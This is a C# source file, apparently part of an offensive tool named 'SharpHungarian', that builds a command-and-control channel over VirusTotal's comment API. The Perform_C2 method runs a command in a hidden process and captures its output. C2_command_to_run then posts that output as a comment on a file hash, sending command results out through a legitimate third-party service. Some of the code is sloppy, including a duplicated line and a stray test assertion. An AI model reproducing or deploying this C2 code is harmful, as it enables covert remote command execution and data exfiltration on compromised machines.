using System;
using System.Collections.Generic;
using System.Text;
using System.Threading.Tasks;
using VirusTotalNet;
using VirusTotalNet.Objects;
using VirusTotalNet.ResponseCodes;
using VirusTotalNet.Results;
using Xunit;
using System.Diagnostics;

namespace SharpHungarian
{
    public class C2connectivitiy 
    {
       
        public async Task C2_outbound (string api_key, string sha1, string upload_to_vt)
        {

            VirusTotal virusTotal = new VirusTotal(api_key);
            virusTotal.UseTLS = true;


            CreateCommentResult comment = await virusTotal.CreateCommentAsync(sha1, upload_to_vt);
            Assert.Equal(CommentResponseCode.Error, comment.ResponseCode);
        }

        public async Task C2_command_to_run(string api_key, string sha1, string process_filename, string process_command)
        {

            VirusTotal virusTotal = new VirusTotal(sha1);
            virusTotal.UseTLS = true;
                        
            string run = Perform_C2(process_filename, process_command);
            await  C2_outbound(api_key, sha1, run);
        }

        public string Perform_C2 (string process_filename, string command)
        {

            Process cmd = new Process();
            cmd.StartInfo.FileName = process_filename;
            cmd.StartInfo.FileName = process_filename;
            cmd.StartInfo.RedirectStandardInput = true;
            cmd.StartInfo.RedirectStandardOutput = true;
            cmd.StartInfo.CreateNoWindow = true;
            cmd.StartInfo.UseShellExecute = false;
            cmd.Start();

            cmd.StandardInput.WriteLine(command);
            cmd.StandardInput.Flush();
            cmd.StandardInput.Close();
            cmd.WaitForExit();
            return cmd.StandardOutput.ReadToEnd();
        }

    }
}